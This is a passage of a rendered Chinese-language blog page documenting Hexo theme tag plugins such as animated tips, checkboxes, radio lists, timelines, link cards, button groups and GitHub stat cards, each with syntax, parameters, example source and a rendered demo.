class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.调整动画速度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div>2.调整动画速度<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hover（当鼠标悬停时显示动画）<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hover（当鼠标悬停在父级元素时显示动画）<div class="tip warning faa-parent animated-hover"><p><code>&lt;p class=&quot;faa-horizontal&quot;&gt;</code>warning <code>&lt;/p&gt;</code></p></div><div class="tip ban faa-parent animated-hover"><p><code>&lt;p class=&quot;faa-flash&quot;&gt;</code>ban <code>&lt;/p&gt;</code></p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="复选列表-checkbox">复选列表 checkbox</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: plus, minus, times</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="单选列表-radio">单选列表 radio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="时间轴-timeline">时间轴 timeline</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>title</code>:标题/时间线</li><li><code>color</code>:<code>timeline</code>颜色:default(留空) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间轴样式,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>时间轴样式</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>不需要额外处理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="链接卡片-link">链接卡片 link</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="按钮-btns">按钮 btns</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;</code>标题 <code>&lt;/b&gt;</code>和 <code>&lt;p&gt;</code>描述文字 <code>&lt;/p&gt;</code></li><li>布局方式：<br>默认为自动宽度，适合视野内只有一两个的情况。</li></ol><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>wide</td><td>宽一点的按钮</td></tr><tr><td>fill</td><td>填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td>center</td><td>居中，按钮之间是固定间距</td></tr><tr><td>around</td><td>居中分散</td></tr><tr><td>grid2</td><td>等宽最多2列，屏幕变窄会适当减少列数</td></tr><tr><td>grid3</td><td>等宽最多3列，屏幕变窄会适当减少列数</td></tr><tr><td>grid4</td><td>等宽最多4列，屏幕变窄会适当减少列数</td></tr><tr><td>grid5</td><td>等宽最多5列，屏幕变窄会适当减少列数</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.或者含有图标的按钮</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://fastly.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://fastly.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://fastly.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div>2.或者含有图标的按钮<div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中<div class="btns circle center grid5">            `<a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>`  `<i class='fab fa-apple'></i>`  `<b>`心率管家 `</b>`  <p class='p red'>专业版</p>  `<img src='https://fastly.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'>``</a>``<a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>`  `<i class='fab fa-apple'></i>`  `<b>`心率管家 `</b>`  <p class='p green'>免费版</p>  `<img src='https://fastly.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'>``</a>`          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="github卡片-ghcard">github卡片 ghcard</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>使用 <code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><table><thead><tr><th><strong>参数名</strong></th><th>取值</th><th>释义</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>隐藏指定统计</td></tr><tr><td>count_private</td><td>true</td><td>将私人项目贡献添加到总提交计数中</td></tr><tr><td>show_icons</td><td>true</td><td>显示图标</td></tr><tr><td>theme</td><td>查阅:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>主题</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125;                | &#123;% ghcard fomalhaut1998, theme=vue %&#125;             |</span><br><span class="line">| ----------------------------------------- | ------------------------------------------------- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125;   | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125;  |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125;            |</span><br></pre></td></tr></table></figure><p>2.仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125;                | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125;             |</span><br><span class="line">| ---------------------------------------------------------- | ------------------------------------------------------------------ |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125;   | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125;  |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125;            |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.用户信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow 